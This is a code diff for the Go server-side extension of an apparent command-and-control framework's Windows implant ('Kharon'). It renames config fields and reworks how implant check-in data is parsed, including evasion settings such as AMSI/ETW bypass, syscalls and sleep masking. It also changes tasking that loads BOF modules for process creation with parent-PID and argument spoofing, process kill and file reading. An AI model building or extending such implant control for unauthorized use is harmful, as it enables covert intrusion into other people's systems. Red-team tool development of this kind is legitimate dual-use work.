@@ -141,6 +141,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	if proxyPass == "<nil>" {
 		proxyPass = ""
 	}
+
 	proxyPass = strings.ReplaceAll(proxyPass, `\`, `\\`)
 	proxyPass = strings.ReplaceAll(proxyPass, `"`, `\"`)
 
@@ -517,83 +518,83 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 }
 
 func GetWindowsVersionName(major uint32, minor uint32, build uint32) string {
-    if major == 10 && minor == 0 {
-        if build >= 22000 {
-            return "Windows 11"
-        }
-        return "Windows 10"
-    }
+	if major == 10 && minor == 0 {
+		if build >= 22000 {
+			return "Windows 11"
+		}
+		return "Windows 10"
+	}
 
-    // Windows 8.1
-    if major == 6 && minor == 3 {
-        return "Windows 8.1"
-    }
+	// Windows 8.1
+	if major == 6 && minor == 3 {
+		return "Windows 8.1"
+	}
 
-    // Windows 8
-    if major == 6 && minor == 2 {
-        return "Windows 8"
-    }
+	// Windows 8
+	if major == 6 && minor == 2 {
+		return "Windows 8"
+	}
 
-    // Windows 7
-    if major == 6 && minor == 1 {
-        return "Windows 7"
-    }
+	// Windows 7
+	if major == 6 && minor == 1 {
+		return "Windows 7"
+	}
 
-    // Windows Vista
-    if major == 6 && minor == 0 {
-        return "Windows Vista"
-    }
+	// Windows Vista
+	if major == 6 && minor == 0 {
+		return "Windows Vista"
+	}
 
-    return fmt.Sprintf("Windows %d.%d (Build %d)", major, minor, build)
+	return fmt.Sprintf("Windows %d.%d (Build %d)", major, minor, build)
 }
 
 func GetDetailedWindowsVersion(major uint32, minor uint32, build uint32) map[string]interface{} {
-    versionInfo := map[string]interface{}{
-        "version_number": fmt.Sprintf("%d.%d", major, minor),
-        "build":          build,
-        "name":           "",
-        "release_name":   "",
-    }
+	versionInfo := map[string]interface{}{
+		"version_number": fmt.Sprintf("%d.%d", major, minor),
+		"build":          build,
+		"name":           "",
+		"release_name":   "",
+	}
 
-    if major == 10 && minor == 0 {
-        versionInfo["name"] = "Windows 10/11"
+	if major == 10 && minor == 0 {
+		versionInfo["name"] = "Windows 10/11"
 
-        if build >= 22000 {
-            versionInfo["name"] = "Windows 11"
-            switch {
-            case build >= 22621:
-                versionInfo["release_name"] = "23H2"
-            case build >= 22000:
-                versionInfo["release_name"] = "21H2"
-            }
-        } else {
-            versionInfo["name"] = "Windows 10"
-            switch {
-            case build >= 19045:
-                versionInfo["release_name"] = "22H2"
-            case build >= 19044:
-                versionInfo["release_name"] = "22H2"
-            case build >= 19043:
-                versionInfo["release_name"] = "21H2"
-            case build >= 19041:
-                versionInfo["release_name"] = "21H1"
-            }
-        }
-    } else if major == 6 && minor == 3 {
-        versionInfo["name"] = "Windows 8.1"
-        versionInfo["release_name"] = "8.1"
-    } else if major == 6 && minor == 2 {
-        versionInfo["name"] = "Windows 8"
-        versionInfo["release_name"] = "8"
-    } else if major == 6 && minor == 1 {
-        versionInfo["name"] = "Windows 7"
-        versionInfo["release_name"] = "7"
-    } else if major == 6 && minor == 0 {
-        versionInfo["name"] = "Windows Vista"
-        versionInfo["release_name"] = "Vista"
-    }
+		if build >= 22000 {
+			versionInfo["name"] = "Windows 11"
+			switch {
+			case build >= 22621:
+				versionInfo["release_name"] = "23H2"
+			case build >= 22000:
+				versionInfo["release_name"] = "21H2"
+			}
+		} else {
+			versionInfo["name"] = "Windows 10"
+			switch {
+			case build >= 19045:
+				versionInfo["release_name"] = "22H2"
+			case build >= 19044:
+				versionInfo["release_name"] = "22H2"
+			case build >= 19043:
+				versionInfo["release_name"] = "21H2"
+			case build >= 19041:
+				versionInfo["release_name"] = "21H1"
+			}
+		}
+	} else if major == 6 && minor == 3 {
+		versionInfo["name"] = "Windows 8.1"
+		versionInfo["release_name"] = "8.1"
+	} else if major == 6 && minor == 2 {
+		versionInfo["name"] = "Windows 8"
+		versionInfo["release_name"] = "8"
+	} else if major == 6 && minor == 1 {
+		versionInfo["name"] = "Windows 7"
+		versionInfo["release_name"] = "7"
+	} else if major == 6 && minor == 0 {
+		versionInfo["name"] = "Windows Vista"
+		versionInfo["release_name"] = "Vista"
+	}
 
-    return versionInfo
+	return versionInfo
 }
 
 func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
@@ -616,61 +617,57 @@ func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
 		return agent, ModuleObject.ext, errors.New("error agent checkin data")
 	}
 
-	khcfg.session.agent_id_str = string(packer.ParsePad(36))
+	khcfg.Session.AgentIdStr = string(packer.ParsePad(36))
 	agentId := fmt.Sprintf("%08x", rand.Uint32())
 	fmt.Printf("Agent ID: %s\n", agentId)
-	fmt.Printf("Agent Random UUID: %s\n", khcfg.session.agent_id_str)
+	fmt.Printf("Agent Random UUID: %s\n", khcfg.Session.AgentIdStr)
 
-	khcfg.session.agent_id_str = agentId
+	khcfg.Session.AgentIdStr = agentId
 
-	// Machine info
-	khcfg.machine.os_arch = packer.ParseInt8()
-	fmt.Printf("OS Arch: %v\n", khcfg.machine.os_arch)
+	khcfg.Machine.OsArch = packer.ParseInt8()
+	fmt.Printf("OS Arch: %v\n", khcfg.Machine.OsArch)
 
-	khcfg.machine.username = string(packer.ParseBytes())
-	fmt.Printf("Username: %v\n", khcfg.machine.username)
+	khcfg.Machine.Username = string(packer.ParseBytes())
+	fmt.Printf("Username: %v\n", khcfg.Machine.Username)
 
-	khcfg.machine.computer = packer.ParseString()
-	fmt.Printf("Computer: %s\n", khcfg.machine.computer)
+	khcfg.Machine.Computer = packer.ParseString()
+	fmt.Printf("Computer: %s\n", khcfg.Machine.Computer)
 
-	khcfg.machine.domain = packer.ParseString()
-	fmt.Printf("Domain: %s\n", khcfg.machine.domain)
+	khcfg.Machine.Domain = packer.ParseString()
+	fmt.Printf("Domain: %s\n", khcfg.Machine.Domain)
 
-	khcfg.machine.netbios = packer.ParseString()
-	fmt.Printf("NETBIOS: %s\n", khcfg.machine.netbios)
+	khcfg.Machine.Netbios = packer.ParseString()
+	fmt.Printf("NETBIOS: %s\n", khcfg.Machine.Netbios)
 
-	khcfg.session.process_id = uint32(packer.ParseInt32())
-	fmt.Printf("PID: %v\n", khcfg.session.process_id)
+	khcfg.Session.ProcessId = uint32(packer.ParseInt32())
+	fmt.Printf("PID: %v\n", khcfg.Session.ProcessId)
 
-	khcfg.session.img_path = packer.ParseString()
-	fmt.Printf("Image Path: %s\n", khcfg.session.img_path)
+	khcfg.Session.ImgPath = packer.ParseString()
+	fmt.Printf("Image Path: %s\n", khcfg.Session.ImgPath)
 
-	// Custom agent storage for kharon config
-	khcfg.session.acp = uint32(packer.ParseInt32())
-	fmt.Printf("ACP: %v\n", khcfg.session.acp)
+	khcfg.Session.Acp = uint32(packer.ParseInt32())
+	fmt.Printf("ACP: %v\n", khcfg.Session.Acp)
 
-	khcfg.session.oemcp = uint32(packer.ParseInt32())
-	fmt.Printf("OEMCP: %v\n", khcfg.session.oemcp)
+	khcfg.Session.Oemcp = uint32(packer.ParseInt32())
+	fmt.Printf("OEMCP: %v\n", khcfg.Session.Oemcp)
 
-	// Evasion features
-	khcfg.evasion.syscall = uint32(packer.ParseInt32())
-	fmt.Printf("Syscall: %v\n", khcfg.evasion.syscall)
+	khcfg.Evasion.Syscall = uint32(packer.ParseInt32())
+	fmt.Printf("Syscall: %v\n", khcfg.Evasion.Syscall)
 
-	khcfg.evasion.bof_proxy = packer.ParseInt32() != 0
-	fmt.Printf("BOF Proxy: %v\n", khcfg.evasion.bof_proxy)
+	khcfg.Evasion.BofProxy = packer.ParseInt32() != 0
+	fmt.Printf("BOF Proxy: %v\n", khcfg.Evasion.BofProxy)
 
-	khcfg.evasion.amsi_etw_bypass = int32(packer.ParseInt32())
-	fmt.Printf("AMSI/ETW Bypass: %v\n", khcfg.evasion.amsi_etw_bypass)
+	khcfg.Evasion.AmsiEtwBypass = int32(packer.ParseInt32())
+	fmt.Printf("AMSI/ETW Bypass: %v\n", khcfg.Evasion.AmsiEtwBypass)
 
-	// Killdate informations
-	khcfg.killdate.enabled = packer.ParseInt32() != 0
-	fmt.Printf("Killdate Enabled: %v\n", khcfg.killdate.enabled)
+	khcfg.Killdate.Enabled = packer.ParseInt32() != 0
+	fmt.Printf("Killdate Enabled: %v\n", khcfg.Killdate.Enabled)
 
-	khcfg.killdate.exit = packer.ParseInt32() != 0
-	fmt.Printf("Killdate Exit: %v\n", khcfg.killdate.exit)
+	khcfg.Killdate.Exit = packer.ParseInt32() != 0
+	fmt.Printf("Killdate Exit: %v\n", khcfg.Killdate.Exit)
 
-	khcfg.killdate.selfdel = packer.ParseInt32() != 0
-	fmt.Printf("Killdate SelfDelete: %v\n", khcfg.killdate.selfdel)
+	khcfg.Killdate.Selfdel = packer.ParseInt32() != 0
+	fmt.Printf("Killdate SelfDelete: %v\n", khcfg.Killdate.Selfdel)
 
 	year := int(packer.ParseInt16())
 	month := int(packer.ParseInt16())
@@ -688,191 +685,176 @@ func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
 		day = 1
 	}
 
-	khcfg.killdate.date = time.Date(year, time.Month(month), day, 0, 0, 0, 0, time.UTC)
-	fmt.Printf("Killdate Date: %s\n", khcfg.killdate.date.Format("02/01/2006"))
+	khcfg.Killdate.Date = time.Date(year, time.Month(month), day, 0, 0, 0, 0, time.UTC)
+	fmt.Printf("Killdate Date: %s\n", khcfg.Killdate.Date.Format("02/01/2006"))
 
-	// Worktime informations
-	khcfg.worktime.enabled = packer.ParseInt32() != 0
-	fmt.Printf("Worktime Enabled: %v\n", khcfg.worktime.enabled)
+	khcfg.Worktime.Enabled = packer.ParseInt32() != 0
+	fmt.Printf("Worktime Enabled: %v\n", khcfg.Killdate.Enabled)
 
 	startHour := packer.ParseInt16()
 	startMin := packer.ParseInt16()
 	endHour := packer.ParseInt16()
 	endMin := packer.ParseInt16()
 
-	khcfg.worktime.start = fmt.Sprintf("%02d:%02d", startHour, startMin)
-	khcfg.worktime.end = fmt.Sprintf("%02d:%02d", endHour, endMin)
-	fmt.Printf("Worktime: %s - %s\n", khcfg.worktime.start, khcfg.worktime.end)
+	khcfg.Worktime.Start = fmt.Sprintf("%02d:%02d", startHour, startMin)
+	khcfg.Worktime.End = fmt.Sprintf("%02d:%02d", endHour, endMin)
+	fmt.Printf("Worktime: %s - %s\n", khcfg.Worktime.Start, khcfg.Worktime.End)
 
-	// Guardrail informations
-	khcfg.guardrails.ipaddress = packer.ParseString()
-	fmt.Printf("Guard IP: %s\n", khcfg.guardrails.ipaddress)
+	khcfg.Guardrails.Ipaddress = packer.ParseString()
+	fmt.Printf("Guard IP: %s\n", khcfg.Guardrails.Ipaddress)
 
-	khcfg.guardrails.hostname = packer.ParseString()
-	fmt.Printf("Guard Hostname: %s\n", khcfg.guardrails.hostname)
+	khcfg.Guardrails.Hostname = packer.ParseString()
+	fmt.Printf("Guard Hostname: %s\n", khcfg.Guardrails.Hostname)
 
-	khcfg.guardrails.username = packer.ParseString()
-	fmt.Printf("Guard Username: %s\n", khcfg.guardrails.username)
+	khcfg.Guardrails.Username = packer.ParseString()
+	fmt.Printf("Guard Username: %s\n", khcfg.Guardrails.Username)
 
-	khcfg.guardrails.domain = packer.ParseString()
-	fmt.Printf("Guard Domain: %s\n", khcfg.guardrails.domain)
+	khcfg.Guardrails.Domain = packer.ParseString()
+	fmt.Printf("Guard Domain: %s\n", khcfg.Guardrails.Domain)
 
-	// Additional session informations
-	khcfg.session.cmd_line = packer.ParseString()
-	fmt.Printf("CommandLine: %v\n", khcfg.session.cmd_line)
+	khcfg.Session.CmdLine = packer.ParseString()
+	fmt.Printf("CommandLine: %v\n", khcfg.Session.CmdLine)
 
-	khcfg.session.heap_handle = uint64(packer.ParseInt64())
-	fmt.Printf("Heap Handle: 0x%X\n", khcfg.session.heap_handle)
+	khcfg.Session.HeapHandle = uint64(packer.ParseInt64())
+	fmt.Printf("Heap Handle: 0x%X\n", khcfg.Session.HeapHandle)
 
-	khcfg.session.elevated = packer.ParseInt32() != 0
-	fmt.Printf("Elevated: %v\n", khcfg.session.elevated)
+	khcfg.Session.Elevated = packer.ParseInt32() != 0
+	fmt.Printf("Elevated: %v\n", khcfg.Session.Elevated)
 
-	khcfg.session.jitter = uint32(packer.ParseInt32())
-	fmt.Printf("Jitter: %v\n", khcfg.session.jitter)
+	khcfg.Session.Jitter = uint32(packer.ParseInt32())
+	fmt.Printf("Jitter: %v\n", khcfg.Session.Jitter)
 
-	khcfg.session.sleep_time = uint32(packer.ParseInt32())
-	fmt.Printf("Sleep(ms): %v\n", khcfg.session.sleep_time)
+	khcfg.Session.SleepTime = uint32(packer.ParseInt32())
+	fmt.Printf("Sleep(ms): %v\n", khcfg.Session.SleepTime)
 
-	khcfg.session.parent_id = uint32(packer.ParseInt32())
-	fmt.Printf("ParentID: %v\n", khcfg.session.parent_id)
+	khcfg.Session.ParentId = uint32(packer.ParseInt32())
+	fmt.Printf("ParentID: %v\n", khcfg.Session.ParentId)
 
-	khcfg.session.process_arch = uint32(packer.ParseInt32())
-	fmt.Printf("Process Arch: %v\n", khcfg.session.process_arch)
+	khcfg.Session.ProcessArch = uint32(packer.ParseInt32())
+	fmt.Printf("Process Arch: %v\n", khcfg.Session.ProcessArch)
 
-	khcfg.session.base.start = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
-	fmt.Printf("Kharon Memory Start: %v\n", khcfg.session.base.start)
+	khcfg.Session.Base.Start = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
+	fmt.Printf("Kharon Memory Start: %v\n", khcfg.Session.Base.Start)
 
-	khcfg.session.base.size = uint32(packer.ParseInt32())
-	fmt.Printf("Kharon Memory Length: %v\n", khcfg.session.base.size)
+	khcfg.Session.Base.Size = uint32(packer.ParseInt32())
+	fmt.Printf("Kharon Memory Length: %v\n", khcfg.Session.Base.Size)
 
-	startAddr, _ := strconv.ParseUint(strings.TrimPrefix(khcfg.session.base.start, "0x"), 16, 64)
-	khcfg.session.base.end = fmt.Sprintf("%#x", startAddr+uint64(khcfg.session.base.size))
-	fmt.Printf("Kharon Memory End: %s\n", khcfg.session.base.end)
+	startAddr, _ := strconv.ParseUint(strings.TrimPrefix(khcfg.Session.Base.Start, "0x"), 16, 64)
+	khcfg.Session.Base.End = fmt.Sprintf("%#x", startAddr+uint64(khcfg.Session.Base.Size))
+	fmt.Printf("Kharon Memory End: %s\n", khcfg.Session.Base.End)
 
-	khcfg.session.thread_id = uint32(packer.ParseInt32())
-	fmt.Printf("TID: %v\n", khcfg.session.thread_id)
+	khcfg.Session.ThreadId = uint32(packer.ParseInt32())
+	fmt.Printf("TID: %v\n", khcfg.Session.ThreadId)
 
-	// Fork informations
-	khcfg.ps.spawnto = string(packer.ParseBytes())
-	fmt.Printf("Spawnto: %v\n", khcfg.ps.spawnto)
+	khcfg.Ps.Spawnto = string(packer.ParseBytes())
+	fmt.Printf("Spawnto: %v\n", khcfg.Ps.Spawnto)
 
-	khcfg.ps.fork_pipe = string(packer.ParseBytes())
-	fmt.Printf("ForkPipeName: %v\n", khcfg.ps.fork_pipe)
+	khcfg.Ps.ForkPipe = string(packer.ParseBytes())
+	fmt.Printf("ForkPipeName: %v\n", khcfg.Ps.ForkPipe)
 
-	// Mask informations 
-	khcfg.mask.jmpgadget = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
-	fmt.Printf("JmpGadget: %v\n", khcfg.mask.jmpgadget)
+	khcfg.Mask.Jmpgadget = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
+	fmt.Printf("JmpGadget: %v\n", khcfg.Mask.Jmpgadget)
 
-	khcfg.mask.heap = packer.ParseInt32() != 0
-	fmt.Printf("Mask Heap: %v\n", khcfg.mask.heap)
+	khcfg.Mask.Heap = packer.ParseInt32() != 0
+	fmt.Printf("Mask Heap: %v\n", khcfg.Mask.Heap)
 
-	khcfg.mask.ntcontinue = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
-	fmt.Printf("NtContinue: %v\n", khcfg.mask.ntcontinue)
+	khcfg.Mask.Ntcontinue = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
+	fmt.Printf("NtContinue: %v\n", khcfg.Mask.Ntcontinue)
 
-	khcfg.mask.beacon = uint32(packer.ParseInt32())
-	fmt.Printf("Mask Beacon: %v\n", khcfg.mask.beacon)
+	khcfg.Mask.Beacon = uint32(packer.ParseInt32())
+	fmt.Printf("Mask Beacon: %v\n", khcfg.Mask.Beacon)
 
-	// Additional machine informations
-	khcfg.machine.processor_name = string(packer.ParseBytes())
-	fmt.Printf("Processor Name: %v\n", khcfg.machine.processor_name)
+	khcfg.Machine.ProcessorName = string(packer.ParseBytes())
+	fmt.Printf("Processor Name: %v\n", khcfg.Machine.ProcessorName)
 
-	khcfg.machine.ipaddress = int32_to_ipv4(packer.ParseInt32())
-	fmt.Printf("IP Address: %s\n", khcfg.machine.ipaddress)
+	khcfg.Machine.Ipaddress = int32_to_ipv4(packer.ParseInt32())
+	fmt.Printf("IP Address: %s\n", khcfg.Machine.Ipaddress)
 
-	khcfg.machine.ram_total = uint32(packer.ParseInt32())
-	fmt.Printf("Total RAM: %v MB\n", khcfg.machine.ram_total)
+	khcfg.Machine.RamTotal = uint32(packer.ParseInt32())
+	fmt.Printf("Total RAM: %v MB\n", khcfg.Machine.RamTotal)
 
-	khcfg.machine.ram_aval = uint32(packer.ParseInt32())
-	fmt.Printf("Available RAM: %v MB\n", khcfg.machine.ram_aval)
+	khcfg.Machine.RamAval = uint32(packer.ParseInt32())
+	fmt.Printf("Available RAM: %v MB\n", khcfg.Machine.RamAval)
 
-	khcfg.machine.ram_used = uint32(packer.ParseInt32())
-	fmt.Printf("Used RAM: %v MB\n", khcfg.machine.ram_used)
+	khcfg.Machine.RamUsed = uint32(packer.ParseInt32())
+	fmt.Printf("Used RAM: %v MB\n", khcfg.Machine.RamUsed)
 
-	khcfg.machine.ram_perct = uint32(packer.ParseInt32())
-	fmt.Printf("Percent RAM: %v%%\n", khcfg.machine.ram_perct)
+	khcfg.Machine.RamPerct = uint32(packer.ParseInt32())
+	fmt.Printf("Percent RAM: %v%%\n", khcfg.Machine.RamPerct)
 
-	khcfg.machine.processor_numbers = uint32(packer.ParseInt32())
-	fmt.Printf("Processors Nbr: %v\n", khcfg.machine.processor_numbers)
+	khcfg.Machine.ProcessorNumbers = uint32(packer.ParseInt32())
+	fmt.Printf("Processors Nbr: %v\n", khcfg.Machine.ProcessorNumbers)
 
-	// Win version
-	khcfg.machine.os_major = uint32(packer.ParseInt32())
-	fmt.Printf("OS Major: %v\n", khcfg.machine.os_major)
+	khcfg.Machine.OsMajor = uint32(packer.ParseInt32())
+	fmt.Printf("OS Major: %v\n", khcfg.Machine.OsMajor)
 
-	khcfg.machine.os_minor = uint32(packer.ParseInt32())
-	fmt.Printf("OS Minor: %v\n", khcfg.machine.os_minor)
+	khcfg.Machine.OsMinor = uint32(packer.ParseInt32())
+	fmt.Printf("OS Minor: %v\n", khcfg.Machine.OsMinor)
 
-	khcfg.machine.os_build = uint32(packer.ParseInt32())
-	fmt.Printf("OS Build: %v\n", khcfg.machine.os_build)
+	khcfg.Machine.OsBuild = uint32(packer.ParseInt32())
+	fmt.Printf("OS Build: %v\n", khcfg.Machine.OsBuild)
 
-	// Memory info
-	khcfg.machine.allocation_gran = uint32(packer.ParseInt32())
-	fmt.Printf("Allocation Granularity: %v\n", khcfg.machine.allocation_gran)
+	khcfg.Machine.AllocationGran = uint32(packer.ParseInt32())
+	fmt.Printf("Allocation Granularity: %v\n", khcfg.Machine.AllocationGran)
 
-	khcfg.machine.page_size = uint32(packer.ParseInt32())
-	fmt.Printf("Page Size: %v\n", khcfg.machine.page_size)
+	khcfg.Machine.PageSize = uint32(packer.ParseInt32())
+	fmt.Printf("Page Size: %v\n", khcfg.Machine.PageSize)
 
-	// Security informations
-	khcfg.machine.cfg_enabled = packer.ParseInt32() != 0
-	fmt.Printf("CFG Enabled: %v\n", khcfg.machine.cfg_enabled)
+	khcfg.Machine.CfgEnabled = packer.ParseInt32() != 0
+	fmt.Printf("CFG Enabled: %v\n", khcfg.Machine.CfgEnabled)
 
-	khcfg.machine.vbs_hvci = uint32(packer.ParseInt32())
-	fmt.Printf("VBS/HVCI Status: %v\n", khcfg.machine.vbs_hvci)
+	khcfg.Machine.VbsHvci = uint32(packer.ParseInt32())
+	fmt.Printf("VBS/HVCI Status: %v\n", khcfg.Machine.VbsHvci)
 
-	khcfg.machine.dse_status = uint32(packer.ParseInt32())
-	fmt.Printf("DSE Status: %v\n", khcfg.machine.dse_status)
+	khcfg.Machine.DseStatus = uint32(packer.ParseInt32())
+	fmt.Printf("DSE Status: %v\n", khcfg.Machine.DseStatus)
 
-	khcfg.machine.testsign_enabled = packer.ParseInt32() != 0
-	fmt.Printf("Test Signing Enabled: %v\n", khcfg.machine.testsign_enabled)
+	khcfg.Machine.TestsignEnabled = packer.ParseInt32() != 0
+	fmt.Printf("Test Signing Enabled: %v\n", khcfg.Machine.TestsignEnabled)
 
-	khcfg.machine.debugmode_enabled = packer.ParseInt32() != 0
-	fmt.Printf("Debug Mode Enabled: %v\n", khcfg.machine.debugmode_enabled)
+	khcfg.Machine.DebugmodeEnabled = packer.ParseInt32() != 0
+	fmt.Printf("Debug Mode Enabled: %v\n", khcfg.Machine.DebugmodeEnabled)
 
-	khcfg.machine.secureboot_enabled = packer.ParseInt32() != 0
-	fmt.Printf("Secure Boot Enabled: %v\n", khcfg.machine.secureboot_enabled)
+	khcfg.Machine.SecurebootEnabled = packer.ParseInt32() != 0
+	fmt.Printf("Secure Boot Enabled: %v\n", khcfg.Machine.SecurebootEnabled)
 
-	// Encryption key
 	key := packer.ParseBytes()
 	fmt.Printf("Session Key: %v\n", key)
 
-	// Process image name
-	process := ConvertCpToUTF8(khcfg.session.img_path, int(khcfg.session.acp))
+	process := ConvertCpToUTF8(khcfg.Session.ImgPath, int(khcfg.Session.Acp))
 	if strings.Contains(process, "\\") {
 		parts := strings.Split(process, "\\")
 		process = parts[len(parts)-1]
 	}
 
-	khcfg.session.img_name = process
+	khcfg.Session.ImgName = process
 
-	versionInfo := GetDetailedWindowsVersion(khcfg.machine.os_major, khcfg.machine.os_minor, khcfg.machine.os_build)
+	versionInfo := GetDetailedWindowsVersion(khcfg.Machine.OsMajor, khcfg.Machine.OsMinor, khcfg.Machine.OsBuild)
 	osDesc := fmt.Sprintf("%s (%s)", versionInfo["name"], versionInfo["release_name"])
 
 	agent = ax.AgentData{
 		Id:         agentId,
 		SessionKey: key,
-		OemCP:      int(khcfg.session.oemcp),
-		ACP:        int(khcfg.session.acp),
-		Sleep:      uint(khcfg.session.sleep_time / 1000),
-		Jitter:     uint(khcfg.session.jitter),
-		Username:   ConvertCpToUTF8(khcfg.machine.username, int(khcfg.session.acp)),
-		Computer:   ConvertCpToUTF8(khcfg.machine.computer, int(khcfg.session.acp)),
+		OemCP:      int(khcfg.Session.Oemcp),
+		ACP:        int(khcfg.Session.Acp),
+		Sleep:      uint(khcfg.Session.SleepTime / 1000),
+		Jitter:     uint(khcfg.Session.Jitter),
+		Username:   ConvertCpToUTF8(khcfg.Machine.Username, int(khcfg.Session.Acp)),
+		Computer:   ConvertCpToUTF8(khcfg.Machine.Computer, int(khcfg.Session.Acp)),
 		Process:    process,
-		Pid:        fmt.Sprintf("%v", khcfg.session.process_id),
-		Tid:        fmt.Sprintf("%v", khcfg.session.thread_id),
+		Pid:        fmt.Sprintf("%v", khcfg.Session.ProcessId),
+		Tid:        fmt.Sprintf("%v", khcfg.Session.ThreadId),
 		Arch:       "x64",
-		Elevated:   khcfg.session.elevated,
+		Elevated:   khcfg.Session.Elevated,
 		Os:         OS_WINDOWS,
 		OsDesc:     osDesc,
-		InternalIP: khcfg.machine.ipaddress,
-		Domain:     khcfg.machine.domain,
+		InternalIP: khcfg.Machine.Ipaddress,
+		Domain:     khcfg.Machine.Domain,
 	}
 
-	data, err := khcfg.Marshal()
-	if err != nil {
-		fmt.Printf("ERROR: %v\n", err)
-		return agent, ModuleObject.ext, nil
-	}
+	khcfg.JsonMarshal(&agent, true)
 
-	agent.CustomData = data
+	fmt.Printf("CustomData len=%d raw=%s\n", len(agent.CustomData), string(agent.CustomData))
 
 	fmt.Printf("Final Agent Struct: %+v\n", agent)
 
@@ -922,22 +904,26 @@ func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
 
 	return data, nil
 }
+
 func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
 	var (
 		taskData    ax.TaskData
 		messageData ax.ConsoleMessageData
 		kharon_cfg  KharonData
 		err         error
+		bofData     []byte
+		bofParam    []byte
+		bofArgs     []byte
+		params      []byte
 	)
 
-	err = kharon_cfg.Unmarshal(agent.CustomData)
+	err = kharon_cfg.JsonUnmarshal(&agent)
 	if err != nil {
 		fmt.Printf("ERROR: %v\n", err)
 		return taskData, messageData, errors.New("'Error reading agent configuration data")
 	}
 
-	fmt.Printf("[DEBUG] CreateTask - kharon_cfg.ps.parent_id = %d\n", kharon_cfg.ps.parent_id)
-    fmt.Printf("[DEBUG] CreateTask - agent.CustomData length = %d\n", len(agent.CustomData))
+	fmt.Printf("[DEBUG] CreateTask - agent.CustomData length = %d\n", len(agent.CustomData))
 
 	command, ok := args["command"].(string)
 	if !ok {
@@ -956,22 +942,17 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 	}
 	messageData.Message, _ = args["message"].(string)
 
-	/// START CODE HERE
-
 	var array []interface{}
 
 	switch command {
 
 	case "process":
-
 		switch subcommand {
-
 		case "list":
-			bofData, err := LoadExtModule("src_core", "list", "x64")
+			bofData, err = LoadExtModule("src_core", "list", "x64")
 			if err != nil {
 				goto RET
 			}
-
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_LIST, 0, 0}
 
 		case "create":
@@ -1002,7 +983,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			domain, _ := args["domain"].(string)
 			username, _ := args["username"].(string)
 			password, _ := args["password"].(string)
-
 			tokenID, _ := args["token"].(int)
 
 			method := 0
@@ -1025,39 +1005,42 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			fmt.Printf("pipe number: %d\n", pipeNum)
-			fmt.Printf("parent id: %d\n", kharon_cfg.ps.parent_id)
-			
+			fmt.Printf("parent id: %d\n", kharon_cfg.Ps.ParentId)
+
 			parts := []string{}
-			if kharon_cfg.ps.parent_id != 0 {
-				parts = append(parts, fmt.Sprintf("PPID: %d", kharon_cfg.ps.parent_id))
+			if kharon_cfg.Ps.ParentId != 0 {
+				parts = append(parts, fmt.Sprintf("PPID: %d", kharon_cfg.Ps.ParentId))
 			}
-			if kharon_cfg.ps.block_dlls {
+			if kharon_cfg.Ps.BlockDlls {
 				parts = append(parts, "BlockDlls: enabled")
 			}
-
 			if len(parts) > 0 {
 				taskData.Message = "Creating process"
 				taskData.Message += fmt.Sprintf(" (%s)", strings.Join(parts, ", "))
 				taskData.MessageType = MESSAGE_INFO
 			}
 
-			bofData, err := LoadExtModule("src_core", "create", "x64")
+			bofData, err = LoadExtModule("src_core", "create", "x64")
 			if err != nil {
 				err = fmt.Errorf("failed to load BOF module: %w", err)
 				goto RET
 			}
 
-			bofParam, err := PackExtData(
-				int(method),
+			if ( len(kharon_cfg.Ps.Spoofarg) > 0 ) {
+				if len(programArgs) > len(kharon_cfg.Ps.Spoofarg) {
+					err = errors.New("Spoof argument needs be greater than legit args")
+					goto RET
+				}
+			}
 
+			bofParam, err = PackExtData(
+				int(method),
 				PackExtDataWChar(programArgs, agent.ACP),
 				int(stateNum),
 				int(pipeNum),
-
 				PackExtDataWChar(domain, agent.ACP),
 				PackExtDataWChar(username, agent.ACP),
 				PackExtDataWChar(password, agent.ACP),
-
 				int(tokenID),
 			)
 			if err != nil {
@@ -1066,6 +1049,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_RUN, len(bofParam), bofParam}
+
 		case "kill":
 			pid, ok := args["pid"].(float64)
 			if !ok {
@@ -1075,44 +1059,36 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			exit_code, _ := args["exit_code"].(int)
 
-			bofData, err := LoadExtModule("src_core", "kill", "x64")
+			bofData, err = LoadExtModule("src_core", "kill", "x64")
 			if err != nil {
 				goto RET
 			}
 
-			bofParam, err := PackExtData(
-				int32(pid),
-				exit_code,
-			)
+			bofParam, err = PackExtData(int32(pid), exit_code)
 			if err != nil {
 				goto RET
 			}
 
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_KILL, len(bofParam), bofParam}
+
 		default:
 			err = errors.New("subcommand for 'ps': 'list', 'run' or 'kill'")
 			goto RET
 		}
 
 	case "fs":
-
 		switch subcommand {
-
 		case "cat":
 			path, ok := args["path"].(string)
 			if !ok {
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-
-			bofData, err := LoadExtModule("src_core", "cat", "x64")
+			bofData, err = LoadExtModule("src_core", "cat", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(path, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(path, agent.ACP))
 			if err != nil {
 				goto RET
 			}
@@ -1124,24 +1100,17 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'path' must be set")
